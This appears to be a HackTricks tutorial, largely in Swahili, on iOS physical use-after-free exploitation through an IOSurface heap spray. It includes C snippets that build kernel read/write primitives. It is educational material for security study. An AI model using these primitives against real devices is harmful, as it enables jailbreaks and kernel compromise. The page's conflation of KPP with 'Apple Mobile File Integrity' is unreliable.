# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## iOS Kupunguza Exploits

- **Code Signing** katika iOS inafanya kazi kwa kuhitaji kila kipande cha msimbo wa utekelezaji (apps, libraries, extensions, n.k.) kusainiwa kwa kisayansi na cheti kinachotolewa na Apple. Wakati msimbo unapoandikwa, iOS inathibitisha saini ya kidigital dhidi ya root inayotambulika ya Apple. Ikiwa saini si sahihi, haipo, au imerekebishwa, OS inakataza kuutumia. Hii inazuia mashambulizi ya kuingiza msimbo hatarishi ndani ya apps halali au kuendesha binaries zisizosainiwa, kwa ufanisi kuvunja sehemu kubwa za minyororo ya exploit zinazotegemea kuendesha msimbo wa kukamata au uliobadilishwa.
- **CoreTrust** ni subsystem ya iOS inayotekeleza uthibitisho wa code signing wakati wa runtime. Inathibitisha saini moja kwa moja kwa kutumia cheti la root la Apple bila kutegemea cached trust stores, ikimaanisha binaries zilizosasishwa na Apple (au zilizo na entitlements sahihi) ndizo zinaweza kutekeleza. CoreTrust inahakikisha kwamba hata kama mshambuliaji atabadili app baada ya kusakinishwa, kurekebisha system libraries, au kujaribu kupakia msimbo usiosainiwa, mfumo utazuia utekelezaji isipokuwa msimbo bado umehifadhiwa kwa usahihi. Utekelezaji mgumu huu unafunga njia nyingi za post-exploitation ambazo toleo la zamani la iOS liliwaruhusu kupitia ukaguzi dhaifu au unaoweza kupitishwa.
- **Data Execution Prevention (DEP)** inachukua maeneo ya kumbukumbu kuwa yasitekelezeke isipokuwa yakitakiwa kuwa na msimbo. Hii inazuia mashambulizi ya kuingiza shellcode ndani ya sehemu za data (kama stack au heap) na kuirusha, ikiwalazimu kutumia mbinu tata kama ROP (Return-Oriented Programming).
- **ASLR (Address Space Layout Randomization)** inabadilisha kwa nasibu anwani za kumbukumbu za msimbo, libraries, stack, na heap kila wakati mfumo unapoanza. Hii inafanya kuwa vigumu kwa mshambuliaji kutabiri wapi maagizo au gadgets muhimu ziko, ikivunja minyororo mingi ya exploit zinazotegemea mipangilio thabiti ya kumbukumbu.
- **KASLR (Kernel ASLR)** inahusu wazo lile lile la randomness kwa kernel ya iOS. Kwa kupangusa anwani ya msingi ya kernel kila boot, inazuia mashambulizi kupata kwa uhakika kazi au miundo ya kernel, na kuongeza ugumu wa explots za ngazi ya kernel ambazo zingekuwa zinapata udhibiti kamili wa mfumo.
- **Kernel Patch Protection (KPP)** pia inajulikana kama **AMCC (Apple Mobile File Integrity)** katika iOS, inafuatilia mara kwa mara kurasa za msimbo wa kernel kuhakikisha hazijabadilishwa. Ikiwa kutamwidihishwa kutambuliwa—kama exploit inayojaribu kubadilisha kazi za kernel au kuingiza msimbo hatarishi—kifaa kitashangaa mara moja na kurudisha boot. Ulinzi huu unafanya exploits za kernel zenye kudumu kuwa ngumu zaidi, kwani mashambulizi hayawezi tu ku-hook au ku-patch maagizo ya kernel bila kusababisha crash ya mfumo.
- **Kernel Text Readonly Region (KTRR)** ni sifa ya usalama inayotokana na vifaa iliyotangazwa kwenye vifaa vya iOS. Inatumia memory controller ya CPU kuashiria eneo la msimbo (text) la kernel kuwa kwa kusomeka tu baada ya boot. Mara limefungwa, hata kernel yenyewe haiwezi kubadilisha eneo hili la kumbukumbu. Hii inazuia mashambulizi—na hata msimbo ulio na vibali vya juu—kutengeneza patch za maagizo ya kernel wakati wa runtime, ikifunga daraja kubwa la exploits zinazotegemea kubadilisha msimbo wa kernel moja kwa moja.
- **Pointer Authentication Codes (PAC)** hutumia saini za kriptografia zilizowekwa ndani ya bits zisizotumika za pointers kuthibitisha uadilifu wao kabla ya matumizi. Wakati pointer (kama return address au function pointer) inaundwa, CPU ina-isaini kwa funguo ya siri; kabla ya dereference, CPU inakagua saini. Ikiwa pointer imebadilishwa, ukaguzi unashindwa na utekelezaji unasimama. Hii inazuia mshambuliaji kuunda kwa udanganyifu au kutumia pointers zilizoharibika katika memory corruption exploits, ikifanya mbinu kama ROP au JOP ziwe ngumu zaidi kutekelezwa kwa ufanisi.
- **Privilege Access never (PAN)** ni sifa ya vifaa inayozuia kernel (hali ya privilage) kutoka kupata moja kwa moja kumbukumbu ya user-space isipokuwa ikiwa kwa wazi inawasha ufikiaji. Hii inazuia mashambulizi yaliyopata kuendesha msimbo wa kernel kwa urahisi kusoma au kuandika kumbukumbu ya user ili kupandisha hadhi au kuiba data nyeti. Kwa kutekeleza mgawanyiko mkali, PAN inapunguza athari za exploits za kernel na kuzuia mbinu nyingi za kawaida za kuongezeka kwa hadhi.
- **Page Protection Layer (PPL)** ni utaratibu wa usalama wa iOS unaolinda maeneo muhimu yanayosimamiwa na kernel, hasa yale yanayohusiana na code signing na entitlements. Inatekeleza ulinzi mkali wa uandishi kwa kutumia MMU (Memory Management Unit) na ukaguzi wa ziada, ikihakikisha kwamba hata msimbo wa kernel wenye privilage hauwezi kubadilisha kurasa nyeti kiholela. Hii inazuia mashambulizi yaliyopata utekelezaji wa ngazi ya kernel kutengeneza udhibiti wa miundo muhimu ya usalama, na kufanya kudumu na kuruka code-signing kuwa ngumu zaidi.

## Physical use-after-free

This is a summary from the post from [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) moreover further information about exploit using this technique can be found in [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

The **virtual memory address space** for user processes on iOS spans from **0x0 to 0x8000000000**. However, these addresses don’t directly map to physical memory. Instead, the **kernel** uses **page tables** to translate virtual addresses into actual **physical addresses**.

#### Levels of Page Tables in iOS

Page tables are organized hierarchically in three levels:

1. **L1 Page Table (Level 1)**:
* Each entry here represents a large range of virtual memory.
* It covers **0x1000000000 bytes** (or **256 GB**) of virtual memory.
2. **L2 Page Table (Level 2)**:
* An entry here represents a smaller region of virtual memory, specifically **0x2000000 bytes** (32 MB).
* An L1 entry may point to an L2 table if it can't map the entire region itself.
3. **L3 Page Table (Level 3)**:
* This is the finest level, where each entry maps a single **4 KB** memory page.
* An L2 entry may point to an L3 table if more granular control is needed.

#### Mapping Virtual to Physical Memory

* **Direct Mapping (Block Mapping)**:
* Some entries in a page table directly **map a range of virtual addresses** to a contiguous range of physical addresses (like a shortcut).
* **Pointer to Child Page Table**:
* If finer control is needed, an entry in one level (e.g., L1) can point to a **child page table** at the next level (e.g., L2).

#### Example: Mapping a Virtual Address

Let’s say you try to access the virtual address **0x1000000000**:

1. **L1 Table**:
* The kernel checks the L1 page table entry corresponding to this virtual address. If it has a **pointer to an L2 page table**, it goes to that L2 table.
2. **L2 Table**:
* The kernel checks the L2 page table for a more detailed mapping. If this entry points to an **L3 page table**, it proceeds there.
3. **L3 Table**:
* The kernel looks up the final L3 entry, which points to the **physical address** of the actual memory page.

#### Example of Address Mapping

If you write the physical address **0x800004000** into the first index of the L2 table, then:

* Virtual addresses from **0x1000000000** to **0x1002000000** map to physical addresses from **0x800004000** to **0x802004000**.
* This is a **block mapping** at the L2 level.

Alternatively, if the L2 entry points to an L3 table:

* Each 4 KB page in the virtual address range **0x1000000000 -> 0x1002000000** would be mapped by individual entries in the L3 table.

### Physical use-after-free

A **physical use-after-free** (UAF) occurs when:

1. A process **allocates** some memory as **readable and writable**.
2. The **page tables** are updated to map this memory to a specific physical address that the process can access.
3. The process **deallocates** (frees) the memory.
4. However, due to a **bug**, the kernel **forgets to remove the mapping** from the page tables, even though it marks the corresponding physical memory as free.
5. The kernel can then **reallocate this "freed" physical memory** for other purposes, like **kernel data**.
6. Since the mapping wasn’t removed, the process can still **read and write** to this physical memory.

This means the process can access **pages of kernel memory**, which could contain sensitive data or structures, potentially allowing an attacker to **manipulate kernel memory**.

### IOSurface Heap Spray

Since the attacker can’t control which specific kernel pages will be allocated to freed memory, they use a technique called **heap spray**:

1. The attacker **creates a large number of IOSurface objects** in kernel memory.
2. Each IOSurface object contains a **magic value** in one of its fields, making it easy to identify.
3. They **scan the freed pages** to see if any of these IOSurface objects landed on a freed page.
4. When they find an IOSurface object on a freed page, they can use it to **read and write kernel memory**.

More info about this in [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Fahamu kwamba vifaa vya iOS 16+ (A12+) vina mitigations za hardware (kama PPL au SPTM) zinazofanya mbinu za physical UAF zisifae vizuri.  
> PPL inatekeleza ulinzi mkali wa MMU kwenye kurasa zinazohusiana na code signing, entitlements, na data nyeti za kernel, kwa hivyo, hata kama ukurasa unatumika tena, maandishi kutoka userland au msimbo wa kernel uliotatizwa kwa kurasa za PPL yanazuia.  
> Secure Page Table Monitor (SPTM) inaongeza ulinzi kwa PPL kwa kuimarisha masasisho ya page table yenyewe. Inahakikisha kwamba hata msimbo mwenye privilage wa kernel hauwezi kupindisha au kugusa mappings bila kupitia ukaguzi ulio salama.  
> KTRR (Kernel Text Read-Only Region), ambayo inalinda sehemu ya msimbo wa kernel kama read-only baada ya boot. Hii inazuia mabadiliko yoyote ya runtime kwa msimbo wa kernel, ikifunga njia kuu ya shambulio ambazo physical UAF exploits mara nyingi hutegemea.  
> Zaidi ya hayo, allocations za `IOSurface` ni ngumu zaidi kutabiri na ngumu kuvutia kwa maeneo yanayoweza kupatikana kwa user, ambayo inafanya mbinu ya kuchunguza “magic value” kuwa sio ya kuaminika. Na `IOSurface` sasa inalindwa kwa entitlements na vizuizi vya sandbox.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: The attacker creates many IOSurface objects with a special identifier ("magic value").
2. **Scan Freed Pages**: They check if any of the objects have been allocated on a freed page.
3. **Read/Write Kernel Memory**: By manipulating fields in the IOSurface object, they gain the ability to perform **arbitrary reads and writes** in kernel memory. This lets them:
* Use one field to **read any 32-bit value** in kernel memory.
* Use another field to **write 64-bit values**, achieving a stable **kernel read/write primitive**.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Tafuta vitu vya **`IOSurface`** kwenye ukurasa mmoja wa kimwili uliotolewa:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Kupata Kusoma/Kuandika Kernel kwa kutumia IOSurface

Baada ya kupata udhibiti wa kipengee cha IOSurface katika kernel memory (mapped to a freed physical page accessible from userspace), tunaweza kukitumia kwa **operesheni za kusoma na kuandika kernel kwa hiari**.

**Sehemu Muhimu katika IOSurface**

Kipengee cha IOSurface kina sehemu mbili muhimu:

1. **Use Count Pointer**: Inaruhusu **kusoma 32-bit**.
2. **Indexed Timestamp Pointer**: Inaruhusu **kuandika 64-bit**.

Kwa kuandika upya pointer hizi, tunaziwekea anwani za hiari katika kernel memory, hivyo kuwezesha uwezo wa kusoma/kuandika.

#### Kusoma 32-Bit ya Kernel

Ili kufanya kusoma:

1. Andika upya **use count pointer** ili ijelekee kwa anwani lengwa ikiondoa offset ya 0x14-byte.
2. Tumia method `get_use_count` kusoma thamani kwenye anwani hiyo.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Ili kufanya uandishi:

1. Andika upya **indexed timestamp pointer** kwa anwani inayolengwa.
2. Tumia method `set_indexed_timestamp` kuandika thamani ya 64-bit.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Muhtasari wa Mtiririko wa Exploit

1. **Trigger Physical Use-After-Free**: Kurasa zilizotolewa zinaweza kutumika tena.
2. **Spray IOSurface Objects**: Tenga IOSurface objects nyingi zenye "magic value" ya kipekee katika kernel memory.
3. **Identify Accessible IOSurface**: Tafuta IOSurface kwenye ukurasa uliotolewa unaodhibiti.
4. **Abuse Use-After-Free**: Badilisha vielekezo katika IOSurface object ili kuwezesha kwa hiari **kernel read/write** kupitia IOSurface methods.

Kwa primitives hizi, exploit hutoa kusoma za **32-bit** zilidhibitiwa na uandishi za **64-bit** kwa kernel memory. Hatua za ziada za jailbreak zinaweza kuhusisha primitives za kusoma/kuandika zenye utulivu zaidi, ambazo zinaweza kuhitaji kupita ulinzi wa ziada (mf., PPL kwenye vifaa vipya vya arm64e).

{{#include ../../banners/hacktricks-training.md}}
